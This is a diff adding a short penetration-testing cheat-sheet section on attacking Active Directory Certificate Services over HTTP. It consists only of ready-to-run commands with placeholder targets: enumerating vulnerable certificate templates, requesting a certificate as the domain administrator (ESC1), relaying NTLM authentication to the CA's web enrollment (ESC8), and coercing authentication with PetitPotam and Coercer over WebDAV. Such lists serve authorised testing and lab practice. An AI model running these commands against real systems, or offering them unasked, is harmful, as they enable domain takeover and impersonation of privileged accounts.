@@ -1,0 +1,15 @@
+PORT 443/80 — HTTP (AD CS / WebDAV)
+bash# AD CS web enrollment
+curl -k https://DC_IP/certsrv/
+certipy find -u user@domain.com -p pass -dc-ip DC_IP -vulnerable -stdout
+
+# ESC1
+certipy req -u user@domain.com -p pass -dc-ip DC_IP -target CA -ca CA_NAME -template VULN -upn administrator@domain.com
+certipy auth -pfx administrator.pfx -dc-ip DC_IP
+
+# ESC8 (NTLM relay to ADCS)
+certipy relay -target http://CA/certsrv/certfnsh.asp
+python3 PetitPotam.py YOURIP DC_IP
+
+# WebDAV coercion (if WebClient running on target)
+python3 Coercer.py -t target -l YOURIP --webdav
